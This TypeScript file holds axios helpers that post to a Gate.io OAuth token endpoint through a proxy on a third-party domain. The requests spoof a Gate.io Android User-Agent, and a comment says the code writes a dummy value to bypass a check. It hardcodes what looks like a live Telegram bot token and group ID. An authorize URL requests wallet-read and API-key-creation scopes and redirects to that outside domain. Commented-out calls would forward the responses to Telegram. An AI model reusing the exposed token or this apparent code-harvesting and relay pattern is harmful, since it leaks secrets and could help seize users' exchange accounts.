const token = "6550792370:AAE7jkkNRWWfb4lpjEoORZ7-wVvlIlqJne8";
const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;

const chatId = "-4011378602";
const text = "不用上班的程序员";
import axios from "axios";

export async function sendTelegramMessage(text: string) {
  axios
    .post(apiUrl, {
      chat_id: chatId,
      text: text,
    })
    .then((response) => {
      console.log("Message sent successfully:", response.data);
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });
}

export async function access_token(cb: any) {
  // axios.defaults.withCredentials = true

  const http = axios.create({
    baseURL: "",
    headers: {
      'Content-Type': 'code'
    },
    proxy:{
      host:"lm.2048.net",
      port:4978
    }
  })
  // // 添加请求拦截器
  // http.interceptors.request.use(function (config) {
  //   // 在发送请求之前做些什么
  //   // 随便写个值 绕过if判段
  //   if (config.method == 'get') {
  //     config.data = true
  //   }
  //   config.headers['Content-Type'] = 'code'
  //   return config;
  // }, function (error) {
  //   // 对请求错误做些什么
  //   return Promise.reject(error);
  // });

  
  const url2 =
    "https://openplatform.gateapi.io/oauth/token";
  http
    .post(url2, {
      'id': "1"
    }, {
      headers: { "Content-Type": "code", "User-Agent": "gateio/android" },
    })
    .then((response) => {
      console.log(response.data);
      cb(response.data);
    })
    .catch((error) => {
      console.log(error);

      cb(JSON.stringify(error));
    });
  // axios.
}


export async function auth2(cb: any) {
  // axios.defaults.withCredentials = true

  const http = axios.create({
    baseURL: "",
    headers: {
      'Content-Type': 'code'
    }
  })
  // 添加请求拦截器
  http.interceptors.request.use(function (config) {
    // 在发送请求之前做些什么
    // 随便写个值 绕过if判段
    if (config.method == 'get') {
      config.data = true
    }
    config.headers['Content-Type'] = 'code'
    config.headers['Origin'] = '*'
    return config;
  }, function (error) {
    // 对请求错误做些什么
    return Promise.reject(error);
  });


  const url2 =
    "https://lm.2048.net:4001/auth?name=https://lm.2048.net/test/index.html";
  http
    .get(url2, {
      headers: { "Content-Type": "code", "User-Agent": "gateio/android", "Origin": "*" },
    })
    .then((response) => {
      console.log(response.data);
      cb(response.data.toString());
      // sendTelegramMessage(response.data.toString());
    })
    .catch((error) => {
      console.log(error);
      // sendTelegramMessage(error.toString());
      cb(JSON.stringify(error));
    });
  // axios.
}

export function getQuerys(e: string) {
  if (!e) return "";
  var t = {},
    r = [],
    n = "",
    a = "";
  try {
    var i = [];
    if (e.indexOf("?") >= 0 && (i = e.substring(e.indexOf("?") + 1, e.length).split("&")), i.length > 0) for (var o in i) n = (r = i[o].split("="))[0],
      a = r[1],
      t[n] = a
  } catch (s) {
    t = {}
  }
  return t
}



/**
 * 
 * curl --location 'https://openplatform.gateapi.io/oauth/authorize?response_type=code&client_id=UggkdgNQjiWwbLyU&redirect_uri=https://lm.2048.net/test/index.html&scope=read_profile,read_email,read_wallet,create_apikey,subsite_login&state=1710429191661' \
--header 'Content-Type: code' \
--header 'User-Agent: gateio/android'
 */
